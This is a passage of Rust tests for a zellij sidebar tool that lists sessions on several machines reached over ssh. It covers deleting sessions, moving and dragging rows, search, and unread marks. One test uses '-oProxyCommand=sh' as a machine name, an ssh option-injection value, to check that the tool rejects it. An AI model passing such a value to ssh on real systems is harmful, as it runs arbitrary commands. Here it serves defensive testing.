        let mut sidebar = fresh();
        let mut host = machines();
        let main = || session("main", 20, vec![pane(1, 0, "/w/b", "fish")]);
        let work = session("work", 30, vec![pane(5, 0, "/w/c", "fish")]);
        host.remotes[0] = remote("nixos", up(vec![main(), work], Vec::new()));
        sidebar.heard(host.clone());
        let look = sidebar.swapping(&Machine::Remote(nixos()), &session_name("main"));
        let clients = vec![Client { id: 1, pane: Some(1) }];
        let before = Some(Before::Listed(Vec::new()));
        sidebar.looked(Looked { number: look.number, went: None, clients, before });
        sidebar.titled("main | fish".to_owned());
        sidebar.focus(Keys::Sidebar);
        let delete = |sidebar: &mut Sidebar| {
            sidebar.cursor = Some(Spot::Remote(nixos(), Place::Session(listed("main", 20))));
            type_in(sidebar, "d");
            sidebar.key(&char('s'), moment(160_000))
        };
        let (on, started) = (Machine::Remote(nixos()), listed("main", 20).started());
        let to = Place::Session(listed("work", 30));
        let leave = Act::Leave { session: session_name("main"), started, to };
        assert_eq!(delete(&mut sidebar), Asked::Delete { on: on.clone(), act: leave });
        host.remotes[0] = remote("nixos", up(vec![main()], Vec::new()));
        sidebar.heard(host);
        let kill = Act::Kill { session: session_name("main"), started };
        assert_eq!(delete(&mut sidebar), Asked::Delete { on, act: kill });
    }

    /// Where the machine luneta's zellij is on has no session left, it goes
    /// on in another's: as their headers are, but those it tried, each
    /// machine's newest first. One lunetad does not reach, or is reaching,
    /// or that has no session, says why it is passed over. Where luneta's
    /// own terminal may be in a pane of another machine's zellij, a session
    /// that may hold it is passed over: one with a pane that runs ssh, or a
    /// luneta, or whose panes zellij there has yet to list.
    #[test]
    fn with_no_session_left_zellij_goes_on_in_another_machine_s_newest() {
        let mut sidebar = fresh();
        let mut host = machines();
        let main = session("main", 20, vec![pane(1, 0, "/w/a", "fish")]);
        let work = session("work", 30, vec![pane(1, 0, "/w/b", "ssh -t mac")]);
        let new = Session { panes: None, ..session("new", 40, Vec::new()) };
        host.remotes[0] = remote("nixos", up(vec![main, work, new], Vec::new()));
        host.remotes.insert(0, remote("empty", up(Vec::new(), Vec::new())));
        let luneta = pane(2, 0, "/w", "/run/current-system/sw/bin/luneta");
        host.remotes[3] = remote("pi", up(vec![session("pi", 10, vec![luneta])], Vec::new()));
        host.remotes.push(remote("far", Reached::Reaching(())));
        sidebar.heard(host);
        let none = Err::<Vec<SessionName>, _>;
        let empty = || ("empty".parse().unwrap(), none(NoRefuge::NoneListed));
        let vps = ("me@vps".parse().unwrap(), none(NoRefuge::Unreached("unreachable")));
        let pi = ("pi".parse().unwrap(), Ok(vec![session_name("pi")]));
        let far = ("far".parse().unwrap(), none(NoRefuge::Reaching));
        let newest = ["new", "work", "main"].map(session_name).to_vec();
        let all = [empty(), (nixos(), Ok(newest)), vps.clone(), pi, far.clone()];
        assert_eq!(sidebar.refuges_away(&[], Within::Here), all);
        let tried = [nixos(), empty().0];
        let held = ("pi".parse().unwrap(), none(NoRefuge::Held));
        let away = sidebar.refuges_away(&[empty().0], Within::MaybeAway);
        let main = (nixos(), Ok(vec![session_name("main")]));
        assert_eq!(away, [main, vps.clone(), held.clone(), far.clone()]);
        assert_eq!(sidebar.refuges_away(&tried, Within::MaybeAway), [vps, held, far]);
    }

    /// zellij goes on by the machines as the sidebar's headers have them, as
    /// you moved them, and not as the hosts file names them.
    #[test]
    fn zellij_goes_on_by_the_machines_as_you_moved_them() {
        let mut sidebar = fresh();
        sidebar.heard(machines());
        sidebar.focus(Keys::Sidebar);
        type_in(&mut sidebar, "hhvJjJ");
        assert_eq!(machines_listed(&sidebar), ["nixos", "pi", "mac", "me@vps"]);
        let refuges = sidebar.refuges_away(&[], Within::Here);
        let order: Vec<String> = refuges.iter().map(|(machine, _)| machine.to_string()).collect();
        assert_eq!(order, ["nixos", "pi", "me@vps"]);
    }

    /// luneta has heard all it needs of a machine once lunetad has its
    /// sessions, or has given up on it, and has yet to hear of one the first
    /// ssh to runs. Where its terminal may be in another machine's zellij,
    /// it has yet to hear of one too whose panes are unlisted, as they say
    /// whether a session may hold it.
    #[test]
    fn luneta_waits_for_machines_lunetad_is_reaching() {
        let mut host = machines();
        let unlisted = Session { panes: None, ..session("new", 40, Vec::new()) };
        host.remotes.push(remote("far", up(vec![unlisted], Vec::new())));
        let (pi, far): (Destination, Destination) =
            ("pi".parse().unwrap(), "far".parse().unwrap());
        assert_eq!(unheard(&host, Within::Here), std::slice::from_ref(&pi));
        assert_eq!(unheard(&host, Within::MaybeAway), [pi, far]);
    }

    /// A delete on another machine's row that waits on your yes deletes
    /// nothing there once lunetad no longer reaches that machine, and says
    /// so, whether or not lunetad answers since: luneta knows none of that
    /// machine's sessions.
    #[test]
    fn a_delete_on_a_machine_lunetad_no_longer_reaches_deletes_nothing() {
        for answers in [true, false] {
            let mut sidebar = fresh();
            let mut host = machines();
            sidebar.heard(host.clone());
            sidebar.focus(Keys::Sidebar);
            sidebar.cursor = Some(Spot::Remote(nixos(), Place::Session(listed("main", 20))));
            type_in(&mut sidebar, "d");
            // Its agent waits for you.
            assert_eq!(sidebar.key(&char('s'), moment(160_000)), Asked::Nothing);
            host.remotes[0] = remote("nixos", down(100));
            sidebar.heard(host);
            if !answers {
                sidebar.lost("lunetad stopped".to_owned());
            }
            assert_eq!(sidebar.key(&char('y'), moment(160_000)), Asked::Nothing);
            let refused = Some("menu: lunetad does not reach nixos now");
            assert_eq!(sidebar.notice.as_deref(), refused, "answers: {answers}");
        }
    }

    /// luneta's zellij on another machine, once a client of a session there
    /// takes the place of its own, is in that machine's session, though this
    /// one has one of its name: the pane it is on there has the mark, and
    /// `Alt Tab` goes among that machine's panes, never to this one's. The
    /// menu over zellij is for that pane, of that machine, and the picker has
    /// luneta's zellij there too, on that pane. A tab of this machine's opens
    /// once luneta's zellij is in its session, as one of another session's of
    /// the same machine does.
    #[test]
    fn luneta_s_zellij_on_another_machine_is_in_that_machine_s_session() {
        let mut sidebar = fresh();
        let mut host = machines();
        let panes = vec![pane(1, 0, "/w/b", "claude"), pane(2, 0, "/w/b", "fish")];
        let agents = vec![agent("main", 1, Status::Idle, Some("fix"))];
        host.remotes[0] = remote("nixos", up(vec![session("main", 20, panes)], agents));
        sidebar.heard(host);
        let look = sidebar.swapping(&Machine::Remote(nixos()), &session_name("main"));
        assert_eq!(look.session, "main");
        let clients = vec![Client { id: 1, pane: Some(1) }];
        let before = Some(Before::Listed(Vec::new()));
        sidebar.looked(Looked { number: look.number, went: None, clients, before });
        sidebar.titled("main | fix".to_owned());

        let there = |pane| pane_of("main", 20, pane);
        assert_eq!(sidebar.here_row, Some(Spot::Remote(nixos(), there(1))));
        let here = sidebar.here_agent().expect("an agent here");
        assert_eq!(here.on, Machine::Remote(nixos()));
        assert_eq!((here.pane, here.dir.as_str()), (1, "/w/b"));
        let lines = screen(&mut sidebar, false, 32, 12);
        assert_eq!(lines[5], "     \u{e795} w/a");
        assert_eq!(lines[8], "▌╭ ✓ \u{ec82} fix                  1m");
        assert_eq!(sidebar.next_pane(), Some(there(2)));
        sidebar.went(&there(2));
        assert_eq!(sidebar.next_pane(), Some(there(1)));
        let on_its_pane = User::Pane { session: session_name("main"), pane: 2 };
        assert_eq!(sidebar.user(&Machine::Remote(nixos())), on_its_pane);
        assert_eq!(sidebar.user(&Machine::Local), User::Away);
        assert_eq!(sidebar.float_menu(), Ok(()));
        let floating = sidebar.menu.take().map(|menu| menu.target().clone());
        let Some(Target::Pane(on, PaneRow { pane: 2, .. })) = floating else {
            panic!("the menu is for {floating:?}");
        };
        assert_eq!(on, Machine::Remote(nixos()));
        let place = PanePlace { session: listed("main", 20), pane: 2 };
        let here = Here::Pane { on: Machine::Remote(nixos()), place };
        assert_eq!(sidebar.listing().here, Some(here));

        sidebar.focus(Keys::Sidebar);
        let here = pane_of("main", 10, 1);
        sidebar.cursor = Some(Spot::Local(here.clone()));
        type_in(&mut sidebar, "n");
        let menu = sidebar.menu.as_ref().map_or(0, Menu::number);
        let tab = Tab { cwd: "/w/a".to_owned(), name: None, command: Vec::new() };
        let open = Open::Tab { session: session_name("main"), tab, alone_since: None };
        let there = Asked::OpenThere { menu, on: Machine::Local, place: here, open };
        assert_eq!(sidebar.key(&char('t'), moment(160_000)), there);
    }

    /// The picker lists the machines lunetad reaches, by this one's name,
    /// each with its sessions and their agents, and none it is reaching or
    /// does not reach. The highlight on a machine's header is on that
    /// machine, and on a row of it, on none.
    #[test]
    fn the_picker_lists_the_machines_lunetad_reaches() {
        let mut sidebar = fresh();
        sidebar.heard(machines());
        let listing = sidebar.listing();
        let names = |runs: &Runs| {
            let sessions = runs.sessions.iter().map(|live| live.place.session().to_owned());
            let agents = runs.agents.iter().map(|seated| seated.label.clone());
            (sessions.collect::<Vec<_>>(), agents.collect::<Vec<_>>())
        };
        let here = (vec!["main".to_owned()], Vec::new());
        assert_eq!((listing.this.as_str(), names(&listing.local)), ("mac", here));
        let remotes: Vec<_> = listing.remotes.iter().map(|(at, runs)| (at, names(runs))).collect();
        let there = (vec!["main".to_owned()], vec!["fix".to_owned()]);
        assert_eq!(remotes, [(&nixos(), there)]);
        sidebar.cursor = Some(Spot::Machine(Machine::Remote(nixos())));
        assert_eq!(sidebar.on_header(), Some(Machine::Remote(nixos())));
        sidebar.cursor = Some(Spot::Remote(nixos(), Place::Session(listed("main", 20))));
        assert_eq!(sidebar.on_header(), None);
    }

    /// `n s` on a machine's header starts a session on that machine, in the
    /// home of its user there; on one lunetad does not reach now, or is
    /// reaching, it starts none, and says so.
    #[test]
    fn n_s_on_a_machine_s_header_starts_a_session_in_its_home() {
        let mut sidebar = fresh();
        sidebar.heard(machines());
        sidebar.focus(Keys::Sidebar);
        for on in [Machine::Local, Machine::Remote(nixos())] {
            sidebar.cursor = Some(Spot::Machine(on.clone()));
            type_in(&mut sidebar, "n");
            let start = Asked::Start { on, starts: Starts::Home };
            assert_eq!(sidebar.key(&char('s'), moment(160_000)), start);
        }
        for far in ["me@vps", "pi"] {
            sidebar.cursor = Some(Spot::Machine(Machine::Remote(far.parse().unwrap())));
            type_in(&mut sidebar, "n");
            assert_eq!(sidebar.key(&char('s'), moment(160_000)), Asked::Nothing);
            let refused = format!("menu: lunetad does not reach {far} now");
            assert_eq!(sidebar.notice.as_deref(), Some(refused.as_str()));
        }
    }

    /// What is pasted in the box `n m` opens goes in it, on one line, and a
    /// link too, rather than opening the menu for the link.
    #[test]
    fn what_is_pasted_in_the_box_for_a_machine_goes_in_it() {
        let mut sidebar = fresh();
        sidebar.heard(machines());
        sidebar.focus(Keys::Sidebar);
        let enter = KeyEvent::new(KeyCode::Enter, KeyModifiers::NONE);
        type_in(&mut sidebar, "nm");
        sidebar.paste("me@vps\n");
        assert_eq!(sidebar.key(&enter, moment(160_000)), Asked::Ssh("me@vps".parse().unwrap()));
        let link = "https://github.com/lorenzolfm/luneta/pull/5";
        type_in(&mut sidebar, "nm");
        sidebar.paste(link);
        assert_eq!(sidebar.key(&enter, moment(160_000)), Asked::Ssh(link.parse().unwrap()));
    }

    /// The header of a machine lunetad does not reach says why in the notes
    /// while the keys have the highlight on it.
    #[test]
    fn an_unreached_machine_says_why_in_the_notes_while_highlighted() {
        let mut sidebar = fresh();
        sidebar.heard(machines());
        sidebar.focus(Keys::Sidebar);
        type_in(&mut sidebar, "Gk");
        let why = " me@vps: ssh: Could not resolve hostname vps; what ssh said is in luneta.log";
        let says = |sidebar: &mut Sidebar| screen(sidebar, true, 96, 24).contains(&why.to_owned());
        assert!(says(&mut sidebar));
        type_in(&mut sidebar, "j");
        assert!(!says(&mut sidebar));
        type_in(&mut sidebar, "k");
        sidebar.focus(Keys::Zellij);
        assert!(!screen(&mut sidebar, false, 96, 24).contains(&why.to_owned()));
    }

    /// A machine lunetad names twice, or by what is no destination, as only a
    /// lunetad of another build might, is listed once, or not, and the notes
    /// say how many are left out.
    #[test]
    fn a_machine_named_twice_or_by_no_destination_is_left_out_and_said() {
        let mut sidebar = fresh();
        let mut host = machines();
        host.remotes.push(remote("nixos", down(100)));
        host.remotes.push(remote("-oProxyCommand=sh", down(100)));
        sidebar.heard(host);
        let lines = screen(&mut sidebar, false, 32, 16);
        let headers = lines.iter().filter(|line| line.starts_with(" ▾ \u{f108} nixos")).count();
        assert_eq!(headers, 1);
        assert!(!lines.iter().any(|line| line.contains("ProxyCommand")));
        assert_eq!(
            lines[13..],
            [
                " lunetad: 2 machines with a de",
                " stination luneta does not rea",
                " d, or named twice, not listed",
            ]
        );
    }

    /// The header of a machine lunetad does not reach has nothing under it
    /// to fold: `h`, `l`, `Space`, `Enter` and a click leave its fold as it
    /// was, for when lunetad reaches it.
    #[test]
    fn an_unreached_machine_s_fold_stays_as_it_was() {
        let mut sidebar = fresh();
        sidebar.heard(machines());
        sidebar.focus(Keys::Sidebar);
        type_in(&mut sidebar, "Gk");
        let vps = Machine::Remote("me@vps".parse().unwrap());
        assert_eq!(sidebar.cursor, Some(Spot::Machine(vps.clone())));
        let enter = KeyEvent::new(KeyCode::Enter, KeyModifiers::NONE);
        let area = Rect::new(0, 0, 32, 26);
        for folded in [false, true] {
            sidebar.folds.set(Fold::Machine(&vps), folded);
            type_in(&mut sidebar, "hl ");
            assert_eq!(sidebar.key(&enter, moment(160_000)), Asked::Nothing);
            let lines = screen(&mut sidebar, true, area.width, area.height);
            assert_eq!(lines[9], " ▸ \u{f108} me@vps · unreachable   1m");
            assert_eq!(click(&mut sidebar, 20, 9, area), Asked::Take);
            assert_eq!(sidebar.folds.contains(Fold::Machine(&vps)), folded);
        }
    }

    /// `n m` on a row the menu opens on, this machine's or a machine's
    /// header, opens a box for what ssh reaches a machine by, and `Enter` has
    /// luneta add it, once it is a destination. `d d` on another machine's
    /// header has luneta forget it, and on this one's says it cannot.
    #[test]
    fn the_menu_adds_a_machine_from_any_row_and_forgets_one_from_its_header() {
        let mut sidebar = fresh();
        sidebar.heard(machines());
        sidebar.focus(Keys::Sidebar);
        type_in(&mut sidebar, "nm-x");
        let enter = KeyEvent::new(KeyCode::Enter, KeyModifiers::NONE);
        assert_eq!(sidebar.key(&enter, moment(160_000)), Asked::Nothing);
        let lines = screen(&mut sidebar, true, 32, 26);
        assert!(lines.iter().any(|line| line.starts_with(" not a destination:")), "{lines:?}");
        let backspace = KeyEvent::new(KeyCode::Backspace, KeyModifiers::NONE);
        sidebar.key(&backspace, moment(160_000));
        sidebar.key(&backspace, moment(160_000));
        type_in(&mut sidebar, "me@box");
        let added = Asked::Ssh("me@box".parse().unwrap());
        assert_eq!(sidebar.key(&enter, moment(160_000)), added);
        assert!(sidebar.menu.is_none());

        type_in(&mut sidebar, "Gk");
        let vps = "me@vps".parse().unwrap();
        assert_eq!(sidebar.cursor, Some(Spot::Machine(Machine::Remote(vps))));
        type_in(&mut sidebar, "d");
        let forget = Asked::Forget("me@vps".parse().unwrap());
        assert_eq!(sidebar.key(&char('d'), moment(160_000)), forget);

        // This machine's header stops the highlight once it is folded.
        type_in(&mut sidebar, "ggkhh");
        assert_eq!(sidebar.cursor, Some(Spot::Machine(Machine::Local)));
        type_in(&mut sidebar, "d");
        assert!(sidebar.menu.is_none());
        assert_eq!(sidebar.key(&char('d'), moment(160_000)), Asked::Nothing);
        assert_eq!(sidebar.notice, None);
    }

    /// This machine, `mac`, with the sessions `main` and `work`, and the
    /// machines of `machines`, `nixos` with a session `dev` after its `main`.
    fn two_each() -> Host {
        let mut host = machines();
        host.sessions.push(session("work", 30, vec![pane(1, 0, "/w/c", "fish")]));
        let Some(Reached::Host(nixos)) = &mut host.remotes[0].reached else {
            panic!("nixos is reached");
        };
        nixos.sessions.push(session("dev", 40, vec![pane(1, 0, "/w/d", "fish")]));
        host
    }

    /// `v` moves the sessions of any machine, each among its own: the last
    /// of this machine's moves no further than the next machine's header,
    /// nor the first of another's than its own, and the other machines'
    /// sessions stay where they were under theirs. The order outlasts the
    /// daemon's next list.
    #[test]
    fn each_machine_s_sessions_move_among_themselves() {
        let mut sidebar = fresh();
        sidebar.heard(two_each());
        sidebar.focus(Keys::Sidebar);
        type_in(&mut sidebar, "jvJJ");
        assert_eq!(names_listed(&sidebar), ["main", "work", "main", "dev"]);
        type_in(&mut sidebar, "K");
        assert_eq!(names_listed(&sidebar), ["work", "main", "main", "dev"]);
        let esc = KeyEvent::new(KeyCode::Esc, KeyModifiers::NONE);
        sidebar.key(&esc, moment(160_000));

        // nixos's dev, from its pane, over its main and no further.
        type_in(&mut sidebar, "Gkk");
        assert_eq!(sidebar.cursor, Some(Spot::Remote(nixos(), pane_of("dev", 40, 1))));
        type_in(&mut sidebar, "vKK");
        assert_eq!(names_listed(&sidebar), ["work", "main", "dev", "main"]);
        assert_eq!(drawn_rows(&mut sidebar).1, [5, 6]);
        sidebar.key(&esc, moment(160_000));
        let rows = rows_shown(&mut sidebar);
        assert_eq!(rows[4], " ▾ \u{f108} nixos ════════════════ ●1");
        assert_eq!(rows[5], " ▾ dev");
        sidebar.heard(two_each());
        assert_eq!(names_listed(&sidebar), ["work", "main", "dev", "main"]);
    }

    /// Another machine's session lifted by its row shows, and lands, among
    /// that machine's alone: held over this machine's, first of its own, and
    /// over the machines after, last.
    #[test]
    fn another_machine_s_session_dragged_lands_among_its_own() {
        let mut sidebar = fresh();
        sidebar.heard(two_each());
        let area = Rect::new(0, 0, 32, 26);
        screen(&mut sidebar, true, area.width, area.height);
        let left = MouseButton::Left;
        // dev's row, under nixos's main, up over mac's.
        sidebar.mouse(mouse(MouseEventKind::Down(left), 10, 11), area);
        assert_eq!(sidebar.mouse(mouse(MouseEventKind::Drag(left), 10, 4), area), Asked::Take);
        let (lines, lit) = seen(&mut sidebar, true, 32, 26);
        assert_eq!((lines[9].as_str(), lit), (" ▾ dev ───────────────────────", vec![9, 10]));
        sidebar.mouse(mouse(MouseEventKind::Up(left), 10, 4), area);
        assert_eq!(names_listed(&sidebar), ["main", "work", "dev", "main"]);
        // dev, now nixos's first, down past every machine.
        sidebar.mouse(mouse(MouseEventKind::Down(left), 10, 9), area);
        sidebar.mouse(mouse(MouseEventKind::Drag(left), 10, 16), area);
        assert_eq!(seen(&mut sidebar, true, 32, 26).1, [11, 12]);
        sidebar.mouse(mouse(MouseEventKind::Up(left), 10, 16), area);
        assert_eq!(names_listed(&sidebar), ["main", "work", "main", "dev"]);
        let rows = rows_shown(&mut sidebar);
        assert_eq!(rows[7], " ▾ dev");
        assert_eq!(rows[9], " ▸ \u{f108} me@vps · unreachable   1m");
    }

    /// The names of the machines the rows list, in their order.
    fn machines_listed(sidebar: &Sidebar) -> Vec<&str> {
        let rows = sidebar.rows.iter();
        rows.filter_map(|row| match row {
            Row::Machine { name, .. } => Some(name.as_str()),
            Row::Session { .. } | Row::Pane { .. } => None,
        })
        .collect()
    }

    /// `v` on a machine's header selects the machine, this one too: `j` and
    /// `k` grow the selection from header to header, and `J` and `K` move
    /// what it holds, each machine with every row under its header, lit, no
    /// further than the ends. The order outlasts the daemon's next list, and
    /// `Esc` ends the selection.
    #[test]
    fn v_on_a_machine_s_header_moves_the_machine() {
        let mut sidebar = fresh();
        sidebar.heard(machines());
        sidebar.focus(Keys::Sidebar);
        // This machine's main, folded, then the machine.
        type_in(&mut sidebar, "hh");
        assert_eq!(sidebar.cursor, Some(Spot::Machine(Machine::Local)));
        type_in(&mut sidebar, "vJ");
        assert_eq!(machines_listed(&sidebar), ["nixos", "mac", "me@vps", "pi"]);
        assert_eq!(seen(&mut sidebar, true, 32, 26).1, [6]);
        type_in(&mut sidebar, "jJ");
        assert_eq!(machines_listed(&sidebar), ["nixos", "pi", "mac", "me@vps"]);
        assert_eq!(seen(&mut sidebar, true, 32, 26).1, [7, 8]);
        type_in(&mut sidebar, "KKK");
        assert_eq!(machines_listed(&sidebar), ["mac", "me@vps", "nixos", "pi"]);
        let (lines, lit) = seen(&mut sidebar, true, 32, 26);
        assert_eq!(lit, [3, 4]);
        assert_eq!(lines[5], " ▾ \u{f108} nixos ════════════════ ●1");
        sidebar.heard(machines());
        assert_eq!(machines_listed(&sidebar), ["mac", "me@vps", "nixos", "pi"]);
        let esc = KeyEvent::new(KeyCode::Esc, KeyModifiers::NONE);
        assert_eq!(sidebar.key(&esc, moment(160_000)), Asked::Nothing);
        assert!(matches!(sidebar.moving, Moving::Still));
    }

    /// A machine's header lifts the machine once the mouse moves a line,
    /// with every row under it, lit, and it lands where it shows, this one
    /// too. Let go on the line it went down on, it is a click, which folds
    /// the machine.
    #[test]
    fn a_machine_dragged_by_its_header_lands_where_it_shows() {
        let mut sidebar = fresh();
        sidebar.heard(machines());
        let area = Rect::new(0, 0, 32, 26);
        screen(&mut sidebar, true, area.width, area.height);
        let left = MouseButton::Left;
        // nixos's header, to the top.
        sidebar.mouse(mouse(MouseEventKind::Down(left), 10, 6), area);
        assert_eq!(sidebar.mouse(mouse(MouseEventKind::Drag(left), 10, 3), area), Asked::Take);
        let (lines, lit) = seen(&mut sidebar, true, 32, 26);
        assert_eq!(lines[HEADER], " ▾ \u{f108} nixos ════════════════ ●1");
        assert_eq!(lit, [3, 4, 5]);
        sidebar.mouse(mouse(MouseEventKind::Up(left), 10, 3), area);
        assert_eq!(machines_listed(&sidebar), ["nixos", "mac", "me@vps", "pi"]);

        // mac's header, now under nixos's rows, to the bottom.
        screen(&mut sidebar, true, area.width, area.height);
        sidebar.mouse(mouse(MouseEventKind::Down(left), 10, 6), area);
        sidebar.mouse(mouse(MouseEventKind::Drag(left), 10, 12), area);
        sidebar.mouse(mouse(MouseEventKind::Up(left), 10, 12), area);
        assert_eq!(machines_listed(&sidebar), ["nixos", "me@vps", "pi", "mac"]);

        screen(&mut sidebar, true, area.width, area.height);
        assert_eq!(click(&mut sidebar, 10, 3, area), Asked::Take);
        assert!(sidebar.folds.contains(Fold::Machine(&Machine::Remote(nixos()))));
        assert_eq!(machines_listed(&sidebar), ["nixos", "me@vps", "pi", "mac"]);
    }

    /// A search looks through every machine's sessions, a folded machine's
    /// too, and keeps the header of each machine it finds rows of.
    #[test]
    fn a_search_finds_another_machine_s_rows_under_its_header() {
        let mut sidebar = fresh();
        sidebar.heard(machines());
        sidebar.folds.set(Fold::Machine(&Machine::Remote(nixos())), true);
        sidebar.focus(Keys::Sidebar);
        type_in(&mut sidebar, "/fix");
        let lines = screen(&mut sidebar, true, 32, 26);
        assert_eq!(
            lines[HEADER..HEADER + 3],
            [
                " ▾ \u{f108} nixos ════════════════ ●1",
                " ▾ main ─────────────────── ●1",
                "   ● \u{ec82} fix                  1m",
            ]
        );
        assert_eq!(lines[HEADER + 3], "");
    }

    /// What you saw of another machine's pane, as `u` marks it read, stays
    /// while lunetad lists its session, and while it does not reach the
    /// machine, for longer than `GONE`: its sessions may run still. Once
    /// lunetad lists the machine with the session gone for `GONE`, it goes.
    #[test]
    fn what_you_saw_on_another_machine_outlasts_its_being_unreached() {
        let mut sidebar = fresh();
        let reached = |sessions: bool| {
            let idle = agent("main", 1, Status::Idle, Some("fix"));
            let main = session("main", 20, vec![pane(1, 0, "/w/b", "claude")]);
            let nixos =
                if sessions { up(vec![main], vec![idle]) } else { up(Vec::new(), Vec::new()) };
            Host { remotes: vec![remote("nixos", nixos)], ..host(Vec::new(), Vec::new()) }
        };
        let row = |sidebar: &mut Sidebar| screen(sidebar, false, 32, 8)[6].clone();
        let seen = "   ✓ \u{ec82} fix                  1m";
        let new = "  •✓ \u{ec82} fix                  1m";
        sidebar.heard(reached(true));
        assert_eq!(row(&mut sidebar), new);
        sidebar.focus(Keys::Sidebar);
        type_in(&mut sidebar, "Gu");
        sidebar.focus(Keys::Zellij);
        tick(&mut sidebar, 140_000);
        tick(&mut sidebar, 155_000);
        assert_eq!(row(&mut sidebar), seen);

        let unreached = Host {
            remotes: vec![remote("nixos", down(150))],
            ..host(Vec::new(), Vec::new())
        };
        sidebar.heard(unreached);
        tick(&mut sidebar, 160_000);
        tick(&mut sidebar, 175_000);
        sidebar.heard(reached(true));
        assert_eq!(row(&mut sidebar), seen);

        sidebar.heard(reached(false));
        tick(&mut sidebar, 176_000);
        tick(&mut sidebar, 187_000);
        sidebar.heard(reached(true));
        assert_eq!(row(&mut sidebar), new);
    }

    /// While lunetad does not reach another machine, what you saw in this
    /// one's sessions goes as ever, once it has not listed one for `GONE`:
    /// only that machine's sessions may run unlisted.
    #[test]
    fn what_you_saw_here_goes_while_another_machine_is_unreached() {
        let mut sidebar = fresh();
        let unreached = |host: Host| Host { remotes: vec![remote("nixos", down(150))], ..host };
        sidebar.heard(unreached(idle_agent()));
        sidebar.titled("s | fish".to_owned());
        let s = |pane| pane_of("s", 10, pane);
        sidebar.went(&s(1));
        tick(&mut sidebar, 160_000);
        tick(&mut sidebar, 161_000);
        sidebar.went(&s(3));
        sidebar.heard(unreached(host(Vec::new(), Vec::new())));
        tick(&mut sidebar, 173_000);
        tick(&mut sidebar, 183_000);
        sidebar.heard(unreached(idle_agent()));
        let new = "  •✓ \u{ec82} fold                 1m";
        assert_eq!(agent_row(&mut sidebar, moment(183_500), true), new);
    }

    /// The names of the sessions the rows list, in their order.
    fn names_listed(sidebar: &Sidebar) -> Vec<&str> {
        let rows = sidebar.rows.iter();
        rows.filter_map(|row| match row {
            Row::Session { session, .. } => Some(session.name.as_str()),
            Row::Machine { .. } | Row::Pane { .. } => None,
        })
        .collect()
    }

    /// A move is made to the rows as the order is kept now, though this
    /// luneta has yet to hear of a move made elsewhere, or never will, as one
    /// whose watcher failed: by the keys or by the mouse, it undoes none.
    #[test]
    fn a_move_keeps_one_made_elsewhere_unheard() {
        let scratch = tempfile::tempdir().unwrap();
        let file = scratch.path().join("order");
        // A luneta that takes up the order only as it moves a session.
        let deaf = || {
            let order = Order::within(file.clone());
            let (folds, news, agent) = (Folds::default(), News::default(), Kept::default());
            let mut sidebar = Sidebar::new(folds, news, order, agent, "mac".to_owned());
            sidebar.heard(searched().host.unwrap());
            sidebar.focus(Keys::Sidebar);
            sidebar
        };
        let (mut here, mut there) = (deaf(), deaf());
        // zed to the top, there.
        type_in(&mut there, "GvKK");
        assert_eq!(names_listed(&there), ["zed", "bipa", "notes"]);
        // notes up one, here, which lists bipa, notes and zed still.
        type_in(&mut here, "jjjvK");
        assert_eq!(names_listed(&here), ["zed", "notes", "bipa"]);

        // zed to the bottom, there, by its row, as it lists bipa over notes
        // still.
        let area = Rect::new(0, 0, 32, 26);
        drawn_rows(&mut there);
        let left = MouseButton::Left;
        there.mouse(mouse(MouseEventKind::Down(left), 10, 4), area);
        there.mouse(mouse(MouseEventKind::Drag(left), 10, 13), area);
        there.mouse(mouse(MouseEventKind::Up(left), 10, 13), area);
        assert_eq!(names_listed(&there), ["notes", "bipa", "zed"]);
        assert_eq!(names_listed(&deaf()), ["notes", "bipa", "zed"]);
    }

    /// Sessions of one name move together, as the order goes by name: by the
    /// later of them as by the first, past a session at a time, by the keys or
    /// by the mouse. Apart, as the daemon lists them oldest first, the one
    /// moved goes beside the other.
    #[test]
    fn sessions_of_a_name_move_together() {
        let mut sidebar = fresh();
        sidebar.heard(host(
            vec![
                session("x", 10, vec![]),
                session("y", 20, vec![pane(1, 0, "/w/y", "fish")]),
                session("x", 30, vec![]),
                session("z", 40, vec![]),
            ],
            Vec::new(),
        ));
        sidebar.focus(Keys::Sidebar);
        // The later x, up beside the first, and down with it, both lit.
        type_in(&mut sidebar, "jjvK");
        assert_eq!(names_listed(&sidebar), ["x", "x", "y", "z"]);
        type_in(&mut sidebar, "J");
        assert_eq!(names_listed(&sidebar), ["y", "x", "x", "z"]);
        assert_eq!(drawn_rows(&mut sidebar).1, [2, 3]);

        // The later x, by its row, under z, the first with it.
        let area = Rect::new(0, 0, 32, 22);
        let left = MouseButton::Left;
        sidebar.mouse(mouse(MouseEventKind::Down(left), 10, 6), area);
        sidebar.mouse(mouse(MouseEventKind::Drag(left), 10, 7), area);
        assert_eq!(drawn_rows(&mut sidebar).1, [3, 4]);
        sidebar.mouse(mouse(MouseEventKind::Up(left), 10, 7), area);
        assert_eq!(names_listed(&sidebar), ["y", "z", "x", "x"]);
    }

    /// What is being read aloud has a line at the bottom, and a mark on the
    /// row of the pane it comes from, and on no other.
    #[test]
    fn what_is_read_aloud_has_a_line_and_a_mark_on_its_row() {
        let panes = vec![pane(1, 0, "/one", "one"), pane(2, 0, "/two", "two")];
        let mut sidebar = Sidebar::default();
        sidebar.heard(host(vec![session("work", 100, panes)], Vec::new()));
        let marked = |sidebar: &mut Sidebar| {
            let shown = screen(sidebar, false, 40, 12);
            shown.into_iter().filter(|row| row.contains(aloud::MARK)).collect::<Vec<_>>()
        };
        assert_eq!(marked(&mut sidebar), [""; 0]);

        let speaker = Zellij { named: "old".to_owned(), session: Some("work".to_owned()), pane: 2 };
        let whose = aloud::Whose::Said { on: Machine::Local, speaker: Some(speaker) };
        let text = "the tests pass".to_owned();
        sidebar.aloud(Some(aloud::Shown::Reading { whose, text, paused: false }));
        let rows = marked(&mut sidebar);
        assert_eq!(rows.len(), 2, "{rows:#?}");
        assert!(rows[0].contains("two"), "{rows:#?}");
        assert!(rows[1].contains("work · the tests pass"), "{rows:#?}");

        sidebar.aloud(None);
        assert_eq!(marked(&mut sidebar), [""; 0]);
    }

    /// A click on an icon on the line of what is read aloud hits what it shows,
    /// and the icon that pauses gives way to the one that goes on, however
    /// narrow the sidebar; and the sidebar collapsed has neither.
    #[test]
    fn the_buttons_of_what_is_read_aloud_are_where_they_show() {
        let reading = |paused| {
            let (whose, text) = (aloud::Whose::Selection, "the tests pass".repeat(9));
            Some(aloud::Shown::Reading { whose, text, paused })
        };
        for width in [NARROWEST, 40] {
            let area = Rect::new(2, 1, width, 12);
            let mut sidebar = Sidebar::default();
            let at = |buffer: &Buffer, icon: &str| {
